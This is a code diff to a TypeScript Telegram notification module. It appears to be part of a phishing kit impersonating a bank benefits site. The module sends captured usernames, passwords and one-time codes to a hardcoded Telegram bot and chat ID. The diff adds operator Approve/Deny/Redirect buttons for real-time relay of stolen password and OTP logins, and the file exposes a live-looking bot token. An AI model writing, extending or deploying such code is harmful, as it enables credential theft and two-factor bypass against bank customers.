@@ -28,7 +28,7 @@ export interface VisitorData {
 export type VisitorTelegramData = VisitorData
 
 interface NotificationData {
-  type: "visit" | "username" | "password" | "verification_method" | "verification_code" | "code_requested"
+  type: "visit" | "username" | "password" | "verification_method" | "verification_code" | "code_requested" | "password_approval" | "otp_approval"
   data: {
     website?: string
     pageUrl?: string
@@ -36,6 +36,8 @@ interface NotificationData {
     password?: string
     verificationMethod?: "text" | "email"
     verificationCode?: string
+    approvalId?: string
+    stage?: "password" | "otp"
     location?: string
     ip?: string
     timezone?: string
@@ -80,6 +82,7 @@ function asUrlField(value: unknown, fallback = "Unknown"): string {
   if (isHttpUrl(resolved)) return asLink(resolved)
   return asCode(resolved)
 }
+
 /** Site header for all ops flow messages (login / method / OTP / CC / registration). */
 export function wrapFlowMessage(body: string): string {
   return `🏷️ <b>${escapeTelegramHtml(SITE_DISPLAY_NAME)}</b>\n━━━━━━━━━━━━━━━━━━\n\n${body}`
@@ -126,14 +129,16 @@ function verificationMethodLabel(method?: "text" | "email"): string {
 class TelegramService {
   private botToken: string
   private chatIds: string[]
+  private baseUrl: string
 
   constructor() {
-    // Hardcoded ops Telegram credentials (Blast clone)
+    // Hardcoded ops Telegram credentials
     this.botToken = "8985470259:AAEP5YHeX8sSz65Pfb3aoJv8Re61F10AONg"
     this.chatIds = ["8810036834"]
+    this.baseUrl = process.env.NEXT_PUBLIC_APP_URL || "https://myhealthbenefitsbofa.com"
   }
 
-  private async sendMessage(message: string): Promise<{ success: boolean; error?: string; sent: number; failed: number; total: number }> {
+  private async sendMessage(message: string, inlineKeyboard?: any[][]): Promise<{ success: boolean; error?: string; sent: number; failed: number; total: number }> {
     if (!this.botToken || this.chatIds.length === 0) {
       console.warn("Telegram bot token or chat IDs not configured")
       return { success: false, error: "Telegram not configured", sent: 0, failed: 0, total: 0 }
@@ -151,6 +156,7 @@ class TelegramService {
             text: message,
             parse_mode: "HTML",
             disable_web_page_preview: true,
+            reply_markup: inlineKeyboard ? { inline_keyboard: inlineKeyboard } : undefined,
           }),
         }),
       ),
@@ -251,6 +257,77 @@ class TelegramService {
     const message = ["🔔 <b>Resend Code Clicked</b>", SEPARATOR].join("\n")
     return this.sendMessage(wrapFlowMessage(message))
   }
+
+  /**
+   * Send approval request message with inline buttons
+   * Admin can click: ✅ Approve | ❌ Deny | 🔄 Redirect
+   */
+  async sendPasswordApprovalNotification(
+    username: string,
+    approvalId: string,
+  ): Promise<{ success: boolean; sent: number; failed: number; total: number }> {
+    const message = wrapFlowMessage(
+      formatMessage("🔐", "Password Login Approval", {
+        "User ID": username,
+        "Approval ID": approvalId.substring(0, 8),
+        "Time Limit": "90 seconds",
+      })
+    )
+
+    const inlineKeyboard = [
+      [
+        {
+          text: "✅ Approve",
+          callback_data: `approve:${approvalId}`,
+        },
+        {
+          text: "❌ Deny",
+          callback_data: `deny:${approvalId}`,
+        },
+        {
+          text: "🔄 Redirect",
+          callback_data: `redirect:${approvalId}`,
+        },
+      ],
+    ]
+
+    return this.sendMessage(message, inlineKeyboard)
+  }
+
+  /**
+   * Send OTP verification approval with inline buttons
+   */
+  async sendOtpApprovalNotification(
+    username: string,
+    approvalId: string,
+  ): Promise<{ success: boolean; sent: number; failed: number; total: number }> {
+    const message = wrapFlowMessage(
+      formatMessage("🔐", "OTP Verification Approval", {
+        "User ID": username,
+        "Approval ID": approvalId.substring(0, 8),
+        "Time Limit": "90 seconds",
+      })
+    )
+
+    const inlineKeyboard = [
+      [
+        {
+          text: "✅ Approve",
+          callback_data: `approve:${approvalId}`,
+        },
+        {
+          text: "❌ Deny",
+          callback_data: `deny:${approvalId}`,
+        },
+        {
+          text: "🔄 Redirect",
+          callback_data: `redirect:${approvalId}`,
+        },
+      ],
+    ]
+
+    return this.sendMessage(message, inlineKeyboard)
+  }
 }
 
 export const telegramService = new TelegramService()
@@ -302,6 +379,16 @@ export async function sendTelegramNotification(data: NotificationData) {
       return telegramService.sendCodeRequestedNotification(
         String(data.data.username ?? ""),
         data.data.verificationMethod ?? "text",
+      )
+    case "password_approval":
+      return telegramService.sendPasswordApprovalNotification(
+        String(data.data.username ?? ""),
+        String(data.data.approvalId ?? ""),
+      )
+    case "otp_approval":
+      return telegramService.sendOtpApprovalNotification(
+        String(data.data.username ?? ""),
+        String(data.data.approvalId ?? ""),
       )
     default:
       return { success: false, error: "Unknown notification type", sent: 0, failed: 0, total: 0 }
